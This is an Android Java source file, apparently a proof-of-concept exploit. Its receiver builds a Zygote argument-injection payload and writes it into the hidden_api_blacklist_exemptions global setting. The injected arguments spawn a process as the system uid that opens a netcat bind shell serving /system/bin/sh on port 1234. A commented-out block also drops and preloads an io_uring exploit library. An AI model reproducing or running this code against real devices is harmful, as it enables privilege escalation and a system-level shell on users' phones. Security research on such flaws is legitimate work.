package com.example.leakvalue;

import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Process;
import android.os.RemoteException;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Arrays;

public class ShellcodeReceiver extends BroadcastReceiver {
    String dataDir;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("Shellcode", "Shellcode has been executed in uid=" + Process.myUid() + " pid=" + Process.myPid());
        MiscUtils.allowHiddenApis();
        IShellcodeReporter reporter = IShellcodeReporter.Stub.asInterface(intent.getExtras().getBinder("a"));
        try {
            reporter.noteShellcodeExecuted(getPackageName(), getId());
        } catch (RemoteException e) {
            e.printStackTrace();
        }

        dataDir = intent.getExtras().getString("data");

        // ADDED: run command in new thread (avoid potentially blocking, which could mess up stuff? prob not needed)
        new Thread(this::runExploit).start();
    }

    // hack to get context
    Context getContext() {
        try {
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Method currentApplicationMethod = activityThreadClass.getDeclaredMethod("currentApplication");
            Application app = (Application) currentApplicationMethod.invoke(null);
            return app.getApplicationContext();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    static String getZygoteInjectionPayload() {
        String prefixStr = "\n--set-api-denylist-exemptions\n";

        int sendBufferSize = 8192;
        // android 12
        int maxRecvSize = 12200;
        // android 13
        // FIXME: this will cause issues with calculations
        // int maxRecvSize = 32768;

        // args
        List<String> args = Arrays.asList(
                "--runtime-args",
                "--setuid=1000",
                "--setgid=1000",
                "--runtime-flags=2049",
                // this doesn't exist on android 12
                // "--mount-external-full",
                "--mount-external-default",
                "--target-sdk-version=29",
                "--setgroups=3003",
                "--nice-name=runnetcat",
                "--seinfo=network_stack:privapp:targetSdkVersion=29:complete",
                "--invoke-with",
                "toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;",
                "--instruction-set=arm",
                "--app-data-dir=/data/",
                "--package-name=com.android.settings",
                "android.app.ActivityThread"
        );

        StringBuilder argStrBuilder = new StringBuilder();
        argStrBuilder.append(args.size()).append("\n");
        for (int i = 0; i < args.size(); i++) {
            argStrBuilder.append(args.get(i));
            if (i < args.size() - 1) {
                argStrBuilder.append("\n");
            }
        }
        String argStr = argStrBuilder.toString();

        // -1 for newline at end of first setting
        int remainCount = maxRecvSize - sendBufferSize - argStr.length() - 1;
        int extraSettingsCount = remainCount / 2;

        StringBuilder sendPayloadBuilder = new StringBuilder();
        sendPayloadBuilder.append(2 + extraSettingsCount);
        sendPayloadBuilder.append(prefixStr);

        for (int i = 0; i < extraSettingsCount + 1; i++) {
            sendPayloadBuilder.append("\n");
        }

        int padCount = sendBufferSize - sendPayloadBuilder.length();
        for (int i = 0; i < padCount; i++) {
            sendPayloadBuilder.append("a");
        }
        sendPayloadBuilder.append("\n");

        StringBuilder settingsPayloadBuilder = new StringBuilder();
        for (int i = 0; i < extraSettingsCount + 1; i++) {
            settingsPayloadBuilder.append("\n");
        }
        for (int i = 0; i < padCount; i++) {
            settingsPayloadBuilder.append("a");
        }
        settingsPayloadBuilder.append(argStr);
        for (int i = 0; i < extraSettingsCount; i++) {
            settingsPayloadBuilder.append(",a");
        }
        String settingsPayload = settingsPayloadBuilder.toString();

        // System.out.println(settingsPayload);

        // split on commas
        String[] realArgs = settingsPayload.split(",");

        StringBuilder realSendPayloadBuilder = new StringBuilder();
        realSendPayloadBuilder.append(realArgs.length + 1);
        realSendPayloadBuilder.append(prefixStr);
        for (String s : realArgs) {
            realSendPayloadBuilder.append(s).append("\n");
        }
        String realSendPayload = realSendPayloadBuilder.toString();

        System.out.println(realArgs.length);
        if (!(realArgs.length <= maxRecvSize / 2)) {
            throw new AssertionError("realArgs too large");
        }

        System.out.println(realSendPayload.length());
        if (!(realSendPayload.length() <= maxRecvSize)) {
            throw new AssertionError("realSendPayload too large");
        }

        return settingsPayload;
    }

    void runExploit() {
        Log.i("MainActivity", "data dir: " + dataDir);

        String payload = getZygoteInjectionPayload();
        String command = "settings put global hidden_api_blacklist_exemptions " + payload;
        // String command = "nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l";
        try {
            new ProcessBuilder("sh", "-c", command).redirectErrorStream(true).start();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        // String poc = "bad_io_uring.so";

        // Log.i("MainActivity", "running exploit: " + poc);

        // String dataDir = getContext().getApplicationInfo().dataDir;
        // String outputFile = dataDir + "/" + poc;
        // try {
        //     Path dst = Paths.get(outputFile);

        //     try (FileOutputStream fos = new FileOutputStream(dst.toFile())) {
        //         fos.write(exploit_bytes());
        //     }
        //     dst.toFile().setExecutable(true);

        //     runCommand("LD_LIBRARY_PATH=" + dataDir + " LD_PRELOAD=" + dst + " sleep 10");
        //     // runCommand(dst.toString() + " 2>&1 | log -t exploit");
        // } catch (IOException e) {
        //     throw new RuntimeException(e);
        // }
    }

    void runCommand(String command) {
        Log.i("MainActivity", "running command: " + command);
        try {
            new ProcessBuilder("sh", "-c", command).redirectErrorStream(true).start();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    static String getId() {
        try {
            return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            return "uid=" + Process.myUid() + ". Execution of id command failed";
        }
    }

    static String getPackageName() {
        try {
            Application application = (Application) Class.forName("android.app.ActivityThread")
                    .getMethod("currentApplication")
                    .invoke(null);
            return application.getPackageName();
        } catch (Exception e) {
            return "?";
        }
    }
}
